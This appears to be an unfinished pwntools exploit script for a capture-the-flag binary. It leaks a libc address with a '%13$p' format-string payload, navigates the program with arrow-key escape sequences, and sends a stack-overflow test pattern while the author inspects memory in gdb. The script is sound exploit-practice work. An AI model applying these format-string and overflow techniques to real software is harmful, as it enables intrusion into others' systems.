from pwn import *
from time import sleep

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-l 100']
context.log_level = 'debug'
file_name = './pwn'
ld_name = './ld-linux-x86-64.so.2'
context.binary = file_name

io = process([ld_name, '--library-path', '.', file_name], env={'TERM': 'xterm'})
libc = ELF('./libc.so.6', checksec=False)
elf = ELF(file_name, checksec=False)
pr = lambda x: success('\x1b[01;38;5;214m' + hex(x) + '\x1b[0m')
sl = lambda x: io.sendline(x)
s = lambda x: io.send(x)
rt = lambda x: io.recvuntil(x)
it = lambda: io.interactive()

LIBC_OFF = 0x29d90
MOVE_SEQ = [b'\x1b[C', b'\x1b[C', b'\x1b[C', b'\x1b[A', b'\x1b[D', b'\x1b[B']


def pay_fmt(pay):
    io.send(pay)


def move(key):
    io.send(key)
    sleep(0.15)


def leak_libc():
    pay_fmt(b'%13$p')
    data = io.recv(timeout=0.2).split(b'\x1b')[0].strip()
    libc.address = int(data, 16) - LIBC_OFF
    pr(libc.address)


def build_dbg():
    pd = b'@' * 0x38
    pd += b'ABCDEFGH'
    pd += b'IJKLMNOP'
    pd += b'QRSTUVWX'
    pd += b'YZabcdef'
    pd += b'ghijklmn'
    return pd


def hit():
    for x in MOVE_SEQ:
        move(x)
    rt(b'Any last words?\n')


if args.GDB:
    gdb.attach(io, 'b *0x401897\nc')

leak_libc()
hit()
log.info('gdb里看: x/0x60bx $rbp-0x40')
log.info('gdb里看: x/12gx $rbp-0x40')
s(build_dbg() + b'\n')
it()
